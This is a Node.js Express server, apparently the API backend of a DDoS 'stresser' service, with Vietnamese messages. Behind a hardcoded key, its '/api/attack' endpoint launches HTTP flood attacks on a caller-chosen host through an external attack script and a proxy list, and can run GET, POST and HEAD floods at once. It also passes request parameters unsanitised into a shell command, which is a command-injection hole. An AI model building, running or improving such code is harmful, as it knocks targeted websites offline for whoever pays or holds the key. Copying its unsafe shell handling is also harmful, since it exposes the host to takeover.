const express = require("express"), { exec } = require("child_process");
const app = express(), port = 8080, MAX_CONCURRENT_ATTACKS = 1;
let activeAttacks = 0, currentPID = null;

const validateInput = ({ key, host, time, method, port }) => {
  if (![key, host, time, method, port].every(Boolean)) return "THIẾU THAM SỐ";
  if (key !== "negan") return "KEY KHÔNG HỢP LỆ";
  if (time > 300) return "THỜI GIAN PHẢI < 300S";
  if (port < 1 || port > 65535) return "CỔNG KHÔNG HỢP LỆ";
  return null;
};

const executeAttack = (command) => {
  return new Promise((resolve, reject) => {
    exec(command, (error, stdout, stderr) => {
      if (stderr) {
        console.error(stderr);
        reject(stderr);
      } else {
        resolve(stdout);
      }
    });
  });
};

const executeAllAttacks = (methods, host, time, threads, rate) => {
  const commands = methods.map((method) => {
    return `node --max-old-space-size=65536 attack -m ${method} -u ${host} -s ${time} -t ${threads} -r ${rate} -p live.txt --full true --ratelimit true --delay 1 --debug false`;
  });

  // Thực thi tất cả các lệnh tấn công song song mà không chờ kết quả
  commands.forEach(executeAttack);
};

app.get("/api/attack", (req, res) => {
  const { key, host, time, method, port, modul, threads, rate } = req.query;
  if (activeAttacks >= MAX_CONCURRENT_ATTACKS || currentPID)
    return res.status(400).json({ status: "ERROR", message: "ĐANG CÓ CUỘC TẤN CÔNG KHÁC", statusCode: 400 });

  const validationMessage = validateInput({ key, host, time, method, port });
  if (validationMessage)
    return res.status(400).json({ status: "ERROR", message: validationMessage, statusCode: 400 });

  activeAttacks++;

  currentPID = Math.floor(Math.random() * 10000) + 1;

  // Kiểm tra modul là FULL và gửi cả 3 lệnh GET, POST, HEAD
  if (modul === "FULL") {
    const methods = ["GET", "POST", "HEAD"];
    executeAllAttacks(methods, host, time, threads, rate);  // Chạy đồng thời các lệnh tấn công mà không chờ kết quả
    res.status(200).json({ 
      status: "SUCCESS", 
      message: "LỆNH TẤN CÔNG (GET, POST, HEAD) ĐÃ GỬI", 
      host, 
      port, 
      time, 
      modul: "GET POST HEAD", 
      method: "attack", 
      pid: currentPID 
    });
  } else {
    const command = `node --max-old-space-size=65536 attack -m ${modul} -u ${host} -s ${time} -t ${threads} -r ${rate} -p live.txt --full true --ratelimit true --delay 1 --debug false`;
    executeAttack(command);  // Chạy tấn công cho modul không phải FULL
    res.status(200).json({ 
      status: "SUCCESS", 
      message: "LỆNH TẤN CÔNG ĐÃ GỬI", 
      host, 
      port, 
      time, 
      modul, 
      method: "attack", 
      pid: currentPID 
    });
  }

  activeAttacks--;
  currentPID = null;
});

app.listen(port, () => console.log(`[API SERVER] CHẠY TẠI CỔNG ${port}`));
